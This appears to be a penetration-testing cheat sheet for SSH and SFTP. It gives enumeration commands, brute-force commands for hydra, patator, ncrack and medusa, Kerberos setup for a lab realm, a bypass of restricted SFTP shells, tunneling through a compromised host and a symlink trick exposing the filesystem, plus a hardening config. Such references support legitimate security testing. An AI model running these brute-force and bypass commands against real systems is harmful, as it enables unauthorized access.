# SSH/SFTP - 22

## SSH Information

The Secure Shell Protocol is a cryptographic network protocol for operating network services securely over an unsecured network. Typical applications include remote command-line, login, and remote command execution, but any network service can be secured with SSH.

**Default Port:** 22 \(can be easily changed\)

**SSH Services:**

* \*\*\*\*[openSSH](http://www.openssh.org/) – OpenBSD SSH, shipped in BSD, Linux distributions, and Windows since Windows 10.
* [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – SSH implementation for Windows.
* [CopSSH](https://www.itefix.net/copssh) – implementation of OpenSSH for Windows.

## SSH Enumeration

### Banner Grabbing

```text
nc -nv 10.10.10.10 22
```

### Weak Cipher Algorithms

Not all cipher algorithms are strong, nmap has a few scripts that enumerate this information:

```bash
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```

## SSH Authentication

We can authenticate to the default port by using `ssh` command:

```text
ssh <target_username>@<target_IP>
```

We can authenticate to a specific port with `-p` option:

```text
ssh <target_username>@<target_IP> -p <target_port>
```

## SSH Keys

### Public Key

First, enumerate if the server accepts public keys:

```text
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```

We can scan public keys with:

```text
ssh-keyscan -t rsa <IP> <PORT>
```

### Private Key

If we have an authorized private key then we can authenticate to the server.

First, we must ensure that the correct permissions are in place with:

```text
chmod 600 id_rsa
```

Then we can authenticate to the server with:

```
ssh -i id_rsa <target_username>@<target_IP>
```

## SSH Brute force

### hydra <a id="hydra"></a>

We can use hydra to bruteforce ssh:

```text
hydra -L <username_wordlist> -P <password_wordlist> ssh://<IP>
hydra -l username -P wordlist.txt ssh://127.0.0.1
hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4
```

### patator <a id="patator"></a>

We can use [patator](https://github.com/lanjelot/patator) as well:

```text
patator ssh_login host=<target_ip> port=<port> user=username password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed'
patator ssh_login host=<target_ip> port=22022 password=FILE0 0=/opt/SecLists/Passwords/probabable-v2-top1575.txt persistent=0
```

### ncrack <a id="ncrack"></a>

ncrack can be used too:

```text
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
```

### medusa <a id="medusa"></a>

medusa is another common tool that's used:

```text
medusa -h <target_ip> -U <users_wordlist.txt> -P <passwords.txt> -M ssh <target_ip>
```

## SSH and Kerberos

We can use the SSH protocol and authenticate with Kerberos.

### krb5

We can use krb5 for user authentication with krb5-user:

```text
sudo apt install krb5-user
```

The default configuration is in **/etc/krb5.conf** and we need to add the target realm:

```text
[libdefaults]
        default_realm = REALCORP.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        REALCORP.HTB = {
                kdc = srv01.realcorp.htb
        }

[domain_realm]
    .realcorp.htb = REALCORP.HTB
    realcorp.htb = REALCORP.HTB
```

Before getting a ticket, we should check our time offset with:

```text
ntpdate -q 10.10.10.224
```

 Then we will need to synchronize our time with the server \(target\) time with:

```text
sudo rdate -n 10.10.10.224
```

 The command to get a ticket is `kinit`.

```text
user@hostname$ kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: 
```

On entering the password above, it just returns without a message, which is good \(entering a bad password throws an error\). Running `klist` shows there’s a ticket on my system:

```text
user@hostname$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
06/09/2021 07:29:18  06/10/2021 07:26:17  krbtgt/REALCORP.HTB@REALCORP.HTB
```

Kerberos can be very picky about DNS names. You need to make sure that your name resolution file is in order that Kerberos will accept:

```text
/etc/hosts
```

SSH in debugging mode to check for errors \(if any\):

```text
 ssh j.nakazawa@10.10.10.224 -vv
```

### crackmapexec 

**crackmapexec** using the `ssh` protocol can use the option `--kerberos` to **authenticate via kerberos**.  
For more info run `crackmapexec ssh --help`.

## SSH Algorithm Fix

Sometimes the server that we want to connect to has another encryption algorithm, to fix this use:

```text
ssh -oKexAlgorithms=diffie-hellman-group1-sha1 username@192.168.1.10
```

## SFTP

Secure File Transfer Protocol, as the name implies this is a mix of SSH and FTP together to encrypt the traffic.

### SFTP command execution <a id="sftp-command-execution"></a>

Another common SSH misconfiguration is often seen in SFTP configuration. Most of the time when creating a SFTP server the administrator want users to have a SFTP access to share files but not to get a remote shell on the machine. So they think that creating a user, attributing him a placeholder shell \(like `/usr/bin/nologin` or `/usr/bin/false`\) and chrooting him in jail is enough to avoid a shell access or abuse on the whole file system. 

However, that's wrong, **a user can ask to execute a command right after authentication before its default command or shell is executed**. 

Bypass the placeholder shell that will deny shell access, one only has to ask to execute a command \(eg. `/bin/bash`\) before, just by doing:

```text
$ ssh -v username@192.168.29.20 id
...
Password:debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.29.20 ([192.168.29.20]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: networkdebug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0​

$ ssh username@192.168.29.20 /bin/bash
```

Here is an example of an SFTP configuration \(`/etc/ssh/sshd_config` – openSSH\) for the user `username`:

```text
Match User username
    ChrootDirectory %h        
    ForceCommand internal-sftp        
    AllowTcpForwarding no        
    PermitTunnel no        
    X11Forwarding no        
    PermitTTY no
```

This configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kinds of port forwarding or tunneling.

### SFTP Tunneling <a id="sftp-tunneling"></a>

If you have access to an SFTP server you can also tunnel your traffic through this for example using the common port forwarding:

```text
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

### SFTP Symlink <a id="sftp-symlink"></a>

SFTP has the command "**symlink**". Therefore, if you have **writable rights** in some folder, you can create **symlinks** of **other folders/files**. As you are probably **trapped** inside a chroot this **won't be especially useful** for you, but, if you can **access** the created **symlink** from a **no-chroot** **service** \(for example, if you can access the symlink from the web\), you could **open the symlinked files through the website**.

For example, to create a **symlink** from a new file **"**_**file\_root**_**" to "**_**/**_**"**:

```text
sftp> symlink / file_root
```

If you can access the file "_file\_root_" via the website, you will be able to list the root \("/"\) folder of the system.













